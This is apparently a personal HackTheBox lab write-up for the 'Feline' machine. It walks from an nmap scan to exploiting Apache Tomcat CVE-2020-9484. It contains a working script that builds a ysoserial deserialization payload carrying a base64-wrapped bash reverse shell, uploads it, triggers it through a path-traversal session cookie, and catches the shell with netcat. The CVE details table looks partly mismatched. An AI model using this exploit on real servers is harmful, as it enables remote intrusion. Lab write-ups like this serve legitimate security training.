---
title: Lab - HackyHour5- Feline
date: 2020-11-13 11:11:11 -0400
description: HackTheBox
categories: [Lab, HackTheBox]
# img: /assets/img/sample/rabbit.png
tags: [Lab, HackTheBox]
---

[toc]

---


# Feline


> Machine: Feline


## Initial：


### Step 1: Recon

```bash
$ nmap -sC -p- 10.10.10.205

PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
4554/tcp open  msfrs
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
```

---

### CVE in 2020

Microsoft CVE-2020-16937: .NET Framework Information Disclosure Vulnerability


| Severity | CVSS                         | Published  |
| -------- | ---------------------------- | ---------- |
| 4        | (AV:N/AC:M/Au:N/C:P/I:N/A:N) | 10/13/2020 |


CVE-2020-9484 Tomcat RCE漏洞分析



| Severity | CVSS                                | Published  |
| -------- | ----------------------------------- | ---------- |
| 4        | AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N | 10/13/2020 |


![Screen Shot 2021-01-08 at 20.11.20](https://i.imgur.com/K1iSwBP.png)
 
---

### excute


```bash
# download ysoserial from https://github.com/frohoff/ysoserial
# name it ysoserial.jar
# put it in the same folder where you will put the next script

# use this script to get shell:
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
ip=$1
port=$2
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
java -jar ysoserial.jar CommonsCollections4 "$jex" > /tmp/$filename.session

curl -s -F "data=@/tmp/$filename.session" http://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null

# start nc listener:
nc -lvnp <port>

# run the script with your ip and port like this:
shell.sh <ip> <port>

# then you can get user.txt with:
cat ~/user.txt
``` 



running reverse shell normally wont work because of javas Runtime.exec(), so we have to create a workaround (http://www.jackson-t.ca/runtime-exec-payloads.html)
- try by entering normal payload e.g. `bash -i >& /dev/tcp/<ip>/<port> 0>&1`



---

ref:
- [masahiro331/CVE-2020-9484](https://github.com/masahiro331/CVE-2020-9484)
- [Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
- [CVE-2020-9484 Tomcat RCE漏洞分析](https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg)
- [IdealDreamLast/CVE-2020-9484](https://github.com/IdealDreamLast/CVE-2020-9484)
- [blog](https://estamelgg.github.io/posts/Feline/)
